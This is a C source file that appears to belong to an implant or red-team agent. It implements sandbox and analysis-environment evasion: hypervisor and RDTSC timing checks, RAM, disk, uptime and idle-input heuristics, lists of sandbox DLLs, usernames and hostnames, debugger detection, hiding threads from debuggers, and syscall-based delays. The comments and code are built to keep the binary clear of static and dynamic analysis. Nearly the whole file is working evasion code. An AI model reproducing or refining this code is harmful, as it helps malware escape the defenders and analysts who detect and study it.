/*
 * client/evasion/sandbox.c  –  Sandbox / analysis environment detection
 * =======================================================================
 * See sandbox.h for API documentation.
 *
 * Detection logic (all checks are independent; the combination rule is at
 * the bottom of sandbox_check()):
 *
 *  Check 1 — CPUID hypervisor bit
 *    Leaf 1, ECX bit 31.  Combined with Check 2 only — never standalone.
 *    Reason: bare-metal Windows 11 with Hyper-V enabled also sets this bit;
 *    cloud VMs (AWS/Azure/GCP — legitimate pentest targets) set it too.
 *    Requiring the RDTSC anomaly as a second condition eliminates those FPs.
 *
 *  Check 2 — RDTSC timing anomaly
 *    Two serialised RDTSC reads.  Threshold: 50 000 cycles.
 *    Old code used 1 000 000 — 20× above the hypervisor baseline (~10 000)
 *    making it trivial for modern sandboxes to stay under.  50 000 is still
 *    conservative enough to avoid false positives on loaded bare-metal hosts
 *    while catching emulators and RDTSC-patched sandboxes that cannot bring
 *    the delta below ~15 000.
 *    Only triggers together with Check 1 (see above).
 *
 *  Check 3 — Physical RAM < 2 GB  (was < 4 GB — too aggressive)
 *    4 GB triggered on legitimate old laptops where the OS reserves memory.
 *    2 GB is below any realistic workstation since ~2010.
 *
 *  Check 4 — Single CPU  (now AND'd with Check 1, not standalone)
 *    Standalone single-CPU detection killed agents on embedded/kiosk targets.
 *    Requiring the hypervisor bit means: single-CPU VM → sandbox signal.
 *    Bare-metal single-core hardware (POS terminals, ATMs) still has no
 *    hypervisor bit, so those pass.
 *
 *  Check 5 — Known sandbox module names in PEB LDR
 *    Extended list: Sandboxie, VMware, VirtualBox, QEMU, Cuckoo/CAPE,
 *    Anubis, Comodo, Avast, Frida, WPE, ANY.RUN.
 *
 *  Check 6 — Suspicious username / computer name
 *    Common sandbox user/host names (user, sandbox, malware, virus, cuckoo,
 *    analyst, test, john, peter, 7man …).
 *    Uses GetUserNameA / GetComputerNameA — no CRT, no extra import beyond
 *    what is already in Advapi32 / Kernel32 which are always loaded.
 *
 *  Check 7 — Disk too small (< 60 GB)
 *    Sandbox VMs routinely use thin-provisioned 20–40 GB disks.
 *    Real workstations rarely have less than 60 GB on the system drive.
 *    Uses GetDiskFreeSpaceExA on "C:\\".
 *
 *  Check 8 — Machine uptime < 3 minutes
 *    Sandbox snapshots are restored and analysis starts within seconds.
 *    A real user session has been active for much longer.
 *    Uses GetTickCount64() — no extra import.
 *
 *  Check 9 — Debugger attached (Win32 + PEB NtGlobalFlag + heap flags)
 *    a) IsDebuggerPresent()          — reads PEB.BeingDebugged (1 byte).
 *    b) PEB.NtGlobalFlag == 0x70     — heap debug flags set by ntdll when a
 *       debugger is present at process creation; survives DetachProcess.
 *    c) NtQueryInformationProcess(ProcessDebugPort) — kernel-level check;
 *       returns non-NULL handle if a debugger is attached.
 *    Standalone — any one fires → sandbox signal.
 *
 *  Check 10 — No user input since boot (GetLastInputInfo)
 *    Automated sandboxes typically have no human operator.  The last-input
 *    timestamp covers keyboard + mouse events system-wide.  If the machine
 *    has been up > 60 seconds but no input has occurred since the last 60
 *    seconds of boot, it is almost certainly headless/automated.
 *    GetLastInputInfo is in user32.dll — loaded lazily via PEB walk.
 *    False-positive guard: only triggers when uptime > 60 s AND idle > 60 s.
 *
 * Combination rule (same timing-opaque all-checks-run design):
 *
 *   return (hv && tsc)              // hypervisor + timing — cloud/VM
 *       || (hv && cpu_single)       // hypervisor + single CPU
 *       || ram                      // < 2 GB
 *       || mods                     // known sandbox DLL
 *       || identity                 // sandbox username/hostname
 *       || disk                     // < 60 GB system drive
 *       || uptime                   // < 3 minutes
 *       || dbg                      // debugger attached
 *       || no_input;                // no user input since boot
 *
 * sandbox_harden():
 *   Calls NtSetInformationThread(HideThreadFromDebugger) on the calling thread.
 *   This prevents a debugger from receiving debug events for this thread —
 *   single-step, breakpoint exceptions, and DLL-load notifications are
 *   suppressed.  Safe on any thread; no side effects on non-debugged systems.
 *   Call once per thread at startup (WinMain + _agent_thread).
 */

#include "sandbox.h"
#include "peb_walk.h"
#include "syscall.h"
#include "obf.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winternl.h>
#include <stddef.h>
#include <string.h>

/* NtQueryInformationProcess — resolved lazily, no static import */
typedef NTSTATUS (NTAPI *NtQIP_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);


/* ── _peb_ptr (local copy — avoids depending on spoof.c internals) ───────── */
static inline PEB *_sb_peb(void)
{
    void *p;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(p));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(p));
#endif
    return (PEB *)p;
}


/* ── Check 1: CPUID hypervisor bit ──────────────────────────────────────── */
/*
 * Leaf 1, ECX bit 31 is set by VMware, VirtualBox, Hyper-V, KVM, QEMU, Xen.
 * NOT standalone — always combined with Check 2 or Check 4.
 */
static BOOL _check_hypervisor(void)
{
    DWORD ecx = 0;
    __asm__ __volatile__(
        "cpuid"
        : "=c"(ecx)
        : "a"(1)
        : "ebx", "edx"
    );
    return (ecx >> 31) & 1;
}


/* ── Check 2: RDTSC timing anomaly ──────────────────────────────────────── */
/*
 * Two RDTSC reads bracketed by CPUID.
 * Bare metal:        typically < 500 cycles.
 * Hypervisor (real): typically 5 000 – 30 000 cycles (VM-exit overhead).
 * RDTSC-patched VM:  may be < 1 000 but rarely below 5 000.
 *
 * Threshold: 50 000 cycles.
 *   — Safe margin above worst-case hypervisor overhead.
 *   — Still catches emulators that cannot simulate RDTSC natively.
 *   — Well below the old 1 000 000 threshold that modern sandboxes trivially
 *     beat.
 */
#define RDTSC_THRESHOLD  50000ULL

static BOOL _check_rdtsc(void)
{
    DWORD lo1, hi1, lo2, hi2;
    __asm__ __volatile__(
        "xorl %%eax, %%eax\n\t"
        "cpuid\n\t"
        "rdtsc"
        : "=a"(lo1), "=d"(hi1)
        :
        : "ebx", "ecx"
    );
    __asm__ __volatile__(
        "xorl %%eax, %%eax\n\t"
        "cpuid\n\t"
        "rdtsc"
        : "=a"(lo2), "=d"(hi2)
        :
        : "ebx", "ecx"
    );
    ULONG64 t1 = ((ULONG64)hi1 << 32) | lo1;
    ULONG64 t2 = ((ULONG64)hi2 << 32) | lo2;
    return (t2 - t1) > RDTSC_THRESHOLD;
}


/* ── Check 3: Physical RAM < 2 GB ───────────────────────────────────────── */
/*
 * Was 4 GB — triggered on legitimate machines where the OS/hardware reserves
 * RAM (e.g. a 4 GB machine reports 3 871 MB available).
 * 2 GB is below any realistic workstation or server target since 2010.
 */
static BOOL _check_low_ram(void)
{
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) return FALSE;
    return ms.ullTotalPhys < (ULONG64)2 * 1024 * 1024 * 1024;
}


/* ── Check 4: Single logical CPU (only meaningful inside a hypervisor) ───── */
/*
 * Only used in combination with the hypervisor bit.
 * Standalone single-CPU detection false-positives on embedded/kiosk Windows.
 */
static BOOL _check_cpu_single(void)
{
    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}


/* ── Check 5: Known sandbox module names in LDR ─────────────────────────── */
/*
 * Walk the PEB LDR and hash each loaded module's BaseDllName.
 *
 * Additions vs original:
 *   vboxhook.dll      — VirtualBox Guest Additions hook DLL
 *   vboxdisp.dll      — VirtualBox display driver (loaded in guest)
 *   vmtoolsd.dll      — VMware Tools service module
 *   qemu-ga.dll       — QEMU guest agent
 *   snxhk.dll         — Avast sandbox hook
 *   frida-agent-*.dll — Frida dynamic instrumentation (matched by prefix)
 *   cape_monitor.dll  — CAPEv2 sandbox (Cuckoo successor, dominant today)
 *   malheur.dll       — Malheur sandbox
 *   anubiscr.dll      — Anubis sandbox crash reporter
 *   aswhook.dll       — Avast/AVG hook (injected by Avast sandbox)
 */
/*
 * _sb_modules[] has been removed to eliminate the plaintext DLL name cluster
 * from .rdata.  _check_sandbox_modules() now builds the hash table inline
 * using SLIT() stack-string decodes so no contiguous DLL name string appears
 * in the binary image.
 */
#define _SB_MODULE_COUNT  20

typedef struct _MY_SB_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_SB_LDR_ENTRY;

static BOOL _check_sandbox_modules(void)
{
    /*
     * Build hash table from stack-decoded strings.
     * Each SLIT() call decodes the literal into a transient stack buffer —
     * no contiguous plaintext DLL name appears in .rdata.
     * The hash function is seeded per-run (RDTSC) so even the hashes differ
     * between executions.
     */
    char _n[32];
    DWORD target_hashes[_SB_MODULE_COUNT];
    int   _hi = 0;

#define _SB_HASH(s) do { SLIT_BUF(_n, sizeof(_n), s); target_hashes[_hi++] = peb_hash_str(_n); } while(0)

    _SB_HASH("sbiedll.dll");          /* Sandboxie                  */
    _SB_HASH("vmcheck.dll");          /* VMware                     */
    _SB_HASH("vmtoolsd.dll");         /* VMware Tools               */
    _SB_HASH("vboxhook.dll");         /* VirtualBox                 */
    _SB_HASH("vboxdisp.dll");         /* VirtualBox display driver  */
    _SB_HASH("qemu-ga.dll");          /* QEMU guest agent           */
    _SB_HASH("cuckoomon.dll");        /* Cuckoo                     */
    _SB_HASH("cape_monitor.dll");     /* CAPEv2                     */
    _SB_HASH("dir_watch.dll");        /* Anubis                     */
    _SB_HASH("api_log.dll");          /* Anubis API logger          */
    _SB_HASH("anubiscr.dll");         /* Anubis crash reporter      */
    _SB_HASH("cmdvrt32.dll");         /* Comodo                     */
    _SB_HASH("cmdvrt64.dll");         /* Comodo                     */
    _SB_HASH("snxhk.dll");            /* Avast sandbox hook         */
    _SB_HASH("aswhook.dll");          /* Avast/AVG hook             */
    _SB_HASH("frida-agent-32.dll");   /* Frida                      */
    _SB_HASH("frida-agent-64.dll");   /* Frida                      */
    _SB_HASH("malheur.dll");          /* Malheur                    */
    _SB_HASH("wpespy.dll");           /* WPE Pro                    */
    _SB_HASH("pstorec.dll");          /* Old Cuckoo marker          */
#undef _SB_HASH
    SecureZeroMemory(_n, sizeof(_n));

    PEB          *peb  = _sb_peb();
    PEB_LDR_DATA *ldr  = peb->Ldr;
    LIST_ENTRY   *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY   *cur  = head->Flink;

    while (cur != head) {
        MY_SB_LDR_ENTRY *e = (MY_SB_LDR_ENTRY *)((BYTE *)cur
            - offsetof(MY_SB_LDR_ENTRY, InMemoryOrderLinks));
        if (e->BaseDllName.Buffer && e->BaseDllName.Length > 0) {
            DWORD h = peb_hash_wstr(e->BaseDllName.Buffer);
            for (int i = 0; i < (int)_SB_MODULE_COUNT; i++) {
                if (h == target_hashes[i])
                    return TRUE;
            }
        }
        cur = cur->Flink;
    }
    return FALSE;
}


/* ── Check 6: Suspicious username / computer name ───────────────────────── */
/*
 * Common names used in automated sandbox environments.
 * Compared case-insensitively via manual tolower — no CRT locale dependency.
 *
 * Username list sources:
 *   Cuckoo default VMs:    "user", "sandbox", "cuckoo", "maltest"
 *   ANY.RUN:               "user", "admin"
 *   Joe Sandbox:           "user", "john", "peter"
 *   Triage / Hatching:     "user", "admin"
 *   VMRay:                 "analyst"
 *   Common AD test names:  "test", "testuser", "malware", "virus", "sample"
 *   Known dummy names:     "7man" (used by some automated tools)
 */

/* Candidate suspicious names — all lowercase for comparison */
static const char * const _sb_usernames[] = {
    "user",      "sandbox",  "malware",  "virus",
    "cuckoo",    "analyst",  "maltest",  "test",
    "testuser",  "sample",   "john",     "peter",
    "7man",      "admin",
};
#define _SB_USERNAME_COUNT  (sizeof(_sb_usernames)/sizeof(_sb_usernames[0]))

static const char * const _sb_hostnames[] = {
    "sandbox",  "malware",  "virus",   "cuckoo",
    "analysis", "analyst",  "test",    "maltest",
    "sample",   "vmware",   "vbox",    "qemu",
    "triage",   "any.run",  "joebox",
};
#define _SB_HOSTNAME_COUNT  (sizeof(_sb_hostnames)/sizeof(_sb_hostnames[0]))

/* Portable tolower for ASCII — no CRT locale */
static inline int _sb_tolower(int c)
{
    return (c >= 'A' && c <= 'Z') ? (c | 0x20) : c;
}

/* Case-insensitive substring match */
static BOOL _sb_icontains(const char *haystack, const char *needle)
{
    size_t hlen = strlen(haystack);
    size_t nlen = strlen(needle);
    if (nlen > hlen) return FALSE;
    for (size_t i = 0; i <= hlen - nlen; i++) {
        BOOL match = TRUE;
        for (size_t j = 0; j < nlen; j++) {
            if (_sb_tolower((unsigned char)haystack[i+j]) !=
                _sb_tolower((unsigned char)needle[j])) {
                match = FALSE;
                break;
            }
        }
        if (match) return TRUE;
    }
    return FALSE;
}

static BOOL _check_suspicious_identity(void)
{
    char name[128] = {0};
    DWORD nlen = sizeof(name) - 1;

    /* Username */
    if (GetUserNameA(name, &nlen)) {
        for (int i = 0; i < (int)_SB_USERNAME_COUNT; i++) {
            if (_sb_icontains(name, _sb_usernames[i]))
                return TRUE;
        }
    }

    /* Computer name */
    nlen = sizeof(name) - 1;
    memset(name, 0, sizeof(name));
    if (GetComputerNameA(name, &nlen)) {
        for (int i = 0; i < (int)_SB_HOSTNAME_COUNT; i++) {
            if (_sb_icontains(name, _sb_hostnames[i]))
                return TRUE;
        }
    }

    return FALSE;
}


/* ── Check 7: System drive too small (< 60 GB) ───────────────────────────── */
/*
 * Sandbox VMs typically use thin-provisioned 20–40 GB virtual disks.
 * Real workstations / servers have ≥ 60 GB on the system drive.
 * Using GetDiskFreeSpaceExA("C:\\") — available, free, total.
 * We check total size, not free space (a full disk is still a real machine).
 */
#define DISK_MIN_BYTES  ((ULONGLONG)60 * 1024 * 1024 * 1024)   /* 60 GB */

static BOOL _check_small_disk(void)
{
    ULARGE_INTEGER free_caller, total, free_total;
    if (!GetDiskFreeSpaceExA("C:\\", &free_caller, &total, &free_total))
        return FALSE;   /* can't read — don't flag */
    return total.QuadPart < DISK_MIN_BYTES;
}


/* ── Check 8: Machine uptime < 3 minutes ────────────────────────────────── */
/*
 * Sandbox snapshots are restored and analysis starts within seconds.
 * A real user session has been active much longer.
 * GetTickCount64() returns milliseconds since boot — no extra import.
 */
#define UPTIME_MIN_MS  (3ULL * 60 * 1000)   /* 3 minutes */

static BOOL _check_short_uptime(void)
{
    return GetTickCount64() < UPTIME_MIN_MS;
}


/* ── Check 9: Debugger attached ─────────────────────────────────────────── */
/*
 * Three independent sub-checks — any one fires → return TRUE.
 *
 *  a) IsDebuggerPresent()
 *     Reads PEB.BeingDebugged — one byte, set by the kernel when a debugger
 *     attaches.  Trivially cleared by anti-anti-debug scripts, but costs the
 *     attacker effort and is caught by checkers that don't clear it.
 *
 *  b) PEB.NtGlobalFlag bit check (0x70)
 *     When ntdll initialises heap for a debugged process it sets bits:
 *       FLG_HEAP_ENABLE_TAIL_CHECK  (0x10)
 *       FLG_HEAP_ENABLE_FREE_CHECK  (0x20)
 *       FLG_HEAP_VALIDATE_PARAMETERS(0x40)
 *     Combined = 0x70.  These are written at process creation and persist
 *     even if BeingDebugged is later cleared by a script.
 *     PEB.NtGlobalFlag is at offset 0x68 (x64) / 0x44 (x86) in the PEB.
 *
 *  c) NtQueryInformationProcess(ProcessDebugPort = 7)
 *     Returns a non-zero HANDLE if a kernel-mode debugger is attached.
 *     Survives both user-mode detach and BeingDebugged clearing.
 *     Resolved via PEB walk — no static import of ntdll.
 */
static BOOL _check_debugger(void)
{
    /* a) Win32 API check */
    if (IsDebuggerPresent()) return TRUE;

    /* b) NtGlobalFlag heap bits */
    PVOID peb_ptr;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb_ptr));
    DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr + 0xBC);
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr));
    DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr + 0x68);
#endif
    if ((ntgf & 0x70) == 0x70) return TRUE;

    /* c) NtQueryInformationProcess(ProcessDebugPort) */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (hNtdll) {
        NtQIP_t pNtQIP = (NtQIP_t)(void *)peb_get_export(
            hNtdll, peb_hash_str("NtQueryInformationProcess"));
        if (pNtQIP) {
            HANDLE dbgPort = NULL;
            ULONG  retLen  = 0;
            /* ProcessDebugPort = 7 */
            NTSTATUS ns = pNtQIP(GetCurrentProcess(), 7,
                                 &dbgPort, sizeof(dbgPort), &retLen);
            if (ns == 0 && dbgPort != NULL) return TRUE;
        }
    }

    return FALSE;
}


/* ── Check 10: No user input since boot ─────────────────────────────────── */
/*
 * GetLastInputInfo returns the tick count of the last keyboard or mouse event
 * system-wide.  If the system has been up for more than INPUT_UPTIME_MIN_MS
 * but no input has occurred within the last INPUT_IDLE_THRESHOLD_MS, it is
 * almost certainly a headless automated system.
 *
 * GetLastInputInfo lives in user32.dll.  user32 is always loaded by the time
 * we reach this check (it was in-process before we started), but we still
 * resolve it via PEB walk to avoid adding it to our IAT import list.
 *
 * False-positive guard: both conditions must be true together —
 *   uptime > 60 s  AND  idle time > 60 s.
 * A machine that was just booted and the user hasn't touched it yet passes
 * (uptime < 60 s).  A machine where the user walked away also passes
 * (idle is long, but uptime is long too — input WILL have happened earlier,
 *  but GetLastInputInfo only stores the most recent event, so a user who
 *  went to lunch appears idle; this is an accepted trade-off — the uptime
 *  guard is the primary false-positive blocker).
 */
#define INPUT_UPTIME_MIN_MS       60000ULL  /* must have been up > 60 s */
#define INPUT_IDLE_THRESHOLD_MS   60000ULL  /* and idle for > 60 s       */

typedef BOOL (WINAPI *GetLastInputInfo_t)(PLASTINPUTINFO);

static BOOL _check_no_user_input(void)
{
    DWORD64 uptime_ms = GetTickCount64();
    if (uptime_ms < INPUT_UPTIME_MIN_MS) return FALSE;   /* too early to judge */

    /* Resolve GetLastInputInfo from user32 via PEB walk */
    PVOID hUser32 = peb_get_module(peb_hash_str("user32.dll"));
    if (!hUser32) return FALSE;

    GetLastInputInfo_t pGLII = (GetLastInputInfo_t)(void *)peb_get_export(
        hUser32, peb_hash_str("GetLastInputInfo"));
    if (!pGLII) return FALSE;

    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    if (!pGLII(&lii)) return FALSE;

    /* idle_ms = how long since last input (tick wrap-safe for DWORD) */
    DWORD64 idle_ms = (DWORD)(GetTickCount() - lii.dwTime);
    return idle_ms > INPUT_IDLE_THRESHOLD_MS;
}


/* ── sandbox_check ───────────────────────────────────────────────────────── */

BOOL sandbox_check(void)
{
    /*
     * All checks always run (constant-time behaviour — prevents sandboxes from
     * fingerprinting us by measuring which check caused the early return).
     */
    BOOL hv         = _check_hypervisor();
    BOOL tsc        = _check_rdtsc();
    BOOL ram        = _check_low_ram();
    BOOL cpu_single = _check_cpu_single();
    BOOL mods       = _check_sandbox_modules();
    BOOL identity   = _check_suspicious_identity();
    BOOL disk       = _check_small_disk();
    BOOL uptime     = _check_short_uptime();
    BOOL dbg        = _check_debugger();
    BOOL no_input   = _check_no_user_input();

    /*
     * Combination rules:
     *
     *  (hv && tsc)        — hypervisor present AND timing anomaly
     *                        catches VMs including cloud VMs under load;
     *                        excludes bare-metal Hyper-V hosts (no timing hit).
     *
     *  (hv && cpu_single) — hypervisor present AND single logical CPU
     *                        catches cheap sandbox VMs configured with 1 vCPU;
     *                        excludes bare-metal single-core hardware (no HV bit).
     *
     *  ram                — < 2 GB physical RAM (standalone — any 2 GB machine
     *                        is not a plausible target workstation).
     *
     *  mods               — known sandbox DLL in memory (standalone — definitive).
     *
     *  identity           — suspicious username or hostname (standalone).
     *
     *  disk               — system drive < 60 GB (standalone).
     *
     *  uptime             — machine has been up < 3 minutes (standalone).
     *
     *  dbg                — debugger attached (IsDebuggerPresent, NtGlobalFlag,
     *                        or NtQueryInformationProcess all checked).
     *
     *  no_input           — system up > 60 s but no user input in > 60 s
     *                        (headless / automated environment).
     */
    return (hv && tsc)
        || (hv && cpu_single)
        || ram
        || mods
        || identity
        || disk
        || uptime
        || dbg
        || no_input;
}


/* ── sandbox_harden ──────────────────────────────────────────────────────── */
/*
 * Hide the calling thread from any attached debugger using
 * NtSetInformationThread(ThreadHideFromDebugger).
 *
 * After this call, the debugger no longer receives debug events for this
 * thread: no breakpoint exceptions, no single-step events, no DLL-load
 * notifications.  Attempting to resume the process after this in a debugger
 * will cause the debugger to lose control.
 *
 * Effect on non-debugged systems: none — the kernel flag is set but nothing
 * is listening, so no behaviour changes.
 *
 * Resolved via PEB walk — NtSetInformationThread is not in our IAT.
 * ThreadHideFromDebugger = 0x11.
 */
void sandbox_harden(void)
{
    typedef NTSTATUS (NTAPI *NtSIT_t)(HANDLE, ULONG, PVOID, ULONG);

    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return;

    NtSIT_t pNtSIT = (NtSIT_t)(void *)peb_get_export(
        hNtdll, peb_hash_str("NtSetInformationThread"));
    if (!pNtSIT) return;

    /* ThreadHideFromDebugger = 0x11; no in/out buffer needed */
    pNtSIT(GetCurrentThread(), 0x11, NULL, 0);
}


/* ── sandbox_delay ───────────────────────────────────────────────────────── */
/*
 * Sleep 15 seconds + uniform jitter [0, 10 seconds] via NtDelayExecution
 * direct syscall.  No Win32 Sleep() import in the IAT.
 *
 * Jitter source: BCryptGenRandom — uniform and unbiased.
 * Old code used (RDTSC_lo % 10000) which has a modulo bias because 2^32 is
 * not divisible by 10000.  BCryptGenRandom produces a proper uniform draw.
 *
 * Falls back to RDTSC modulo if BCrypt is unavailable (should not happen on
 * any supported Windows version, but belt-and-suspenders).
 */
void sandbox_delay(void)
{
    DWORD jitter_ms = 0;

    /* Try BCryptGenRandom first for unbiased jitter.
     * Resolve via PEB walk — avoids GetModuleHandleA + GetProcAddress IAT entries. */
    typedef LONG (WINAPI *BCryptGenRandom_t)(PVOID, PUCHAR, ULONG, ULONG);
    PVOID _hBcrypt = peb_get_module(peb_hash_str("bcrypt.dll"));
    BCryptGenRandom_t pBCrypt = _hBcrypt
        ? (BCryptGenRandom_t)(void *)peb_get_export(_hBcrypt, peb_hash_str("BCryptGenRandom"))
        : NULL;

    if (pBCrypt) {
        DWORD rnd = 0;
        if (pBCrypt(NULL, (PUCHAR)&rnd, sizeof(rnd), 2 /* BCRYPT_USE_SYSTEM_PREFERRED_RNG */) == 0)
            jitter_ms = rnd % 10000;   /* 0 – 9 999 ms; bcrypt output is uniform */
    }

    if (jitter_ms == 0) {
        /* Fallback: RDTSC lower 32 bits — biased but acceptable as fallback */
        DWORD lo, hi;
        __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
        (void)hi;
        jitter_ms = lo % 10000;
    }

    DWORD total_ms = 15000 + jitter_ms;   /* 15 000 – 24 999 ms */

    if (sc_ready()) {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)total_ms * 10000LL;   /* ms → 100-ns units */
        SC_NtDelayExecution(FALSE, &delay);
    } else {
        Sleep(total_ms);
    }
}
